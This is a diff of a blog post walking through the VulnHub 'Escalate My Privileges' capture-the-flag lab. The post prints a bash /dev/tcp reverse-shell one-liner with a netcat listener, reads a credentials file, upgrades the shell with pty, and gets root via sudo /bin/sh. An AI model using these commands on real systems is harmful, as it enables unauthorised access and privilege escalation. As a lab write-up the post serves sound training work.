@@ -1,5 +1,7 @@
 ---
 published: false
+layout: post
+category: vulnhub
 ---
 URL: [Escalate Privs Vulnhub](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/)
 
@@ -29,3 +31,71 @@ Opening up port 80 in a browser, we get this:
 
 ![p80](https://imgur.com/76wn0qP.png)
 
+The nmap scan identified a robots.txt file which is worth checking out. Go to 192.168.56.113/robots.txt and there is an entry with the following:
+
+<pre> - User-agent: *
+Disallow: /phpbash.php</pre>
+
+This means they do not want that page to be shown in google so we'll check it out anyway.
+
+Going to 192.168.56.113/phpbash.php gives us the following page:
+
+![phpbash](https://imgur.com/nQxbms3.png)
+
+We already have a lower priv shell with the ID "apache". We are currently in the www/html directory where the web files are kept. 
+
+### Upgrade Shell
+
+Upgrading to a reverse shell will be easier to work with. I use [this website](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to decide how I will get a reverse shell. Simply use the bash 'one-liner' and listen to a chosen port. 
+
+<pre>bash -i >& /dev/tcp/192.168.56.101/4545 0>&1 </pre>
+
+![rev_shell](https://i.imgur.com/QYgCcDI.png)
+
+In this case, the reverse shell will be aimed at my local IP 192.168.56.101 on port 4545. Therefore set up a netcat listener on this port.
+
+Make sure the netcat is set up before the command is executed. 
+
+<pre>nc -nvlp 4545</pre>
+
+Then execute the reverse shell and a connection should be established with user "apache".
+
+![netcat](https://i.imgur.com/AFYGLzO.png)
+
+### Privilege Escalation
+
+After some enumeration, some files are found in the home directory of "armour". The contents of Credentials.txt reveal a password with md5(). Md5 is an algorithm that is widely used for hash functions producing a 128-bit hash value.
+
+The md5 value has been shown by echo.
+
+<pre>cd /home/armour
+ls -la
+cat Credentials.txt
+echo -n "rootroot1" | md5sum </pre>
+
+![md5](https://imgur.com/BJ1q5M4.png)
+
+Let's try and use this password for the user "armour" by changing the user with the following command:
+
+<pre>su amour</pre>
+
+![armour](https://imgur.com/iJDJnlr.png)
+
+The password is correct, we now have a new shell with ID armour. Make sure to upgrade the shell.
+
+<pre>id
+python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+
+First thing to do is to check the sudo privileges:
+
+<pre>sudo -l</pre>
+
+![sudo-l](https://imgur.com/qfvwZll.png)
+
+There is a huge amount of options to explore however just by exploiting the first entry /bin/sh should give sudo privileges.
+
+<pre>sudo /bin/sh</pre>
+
+![root](https://imgur.com/aETTEPy.png)
+
+And there is the flag in /root.
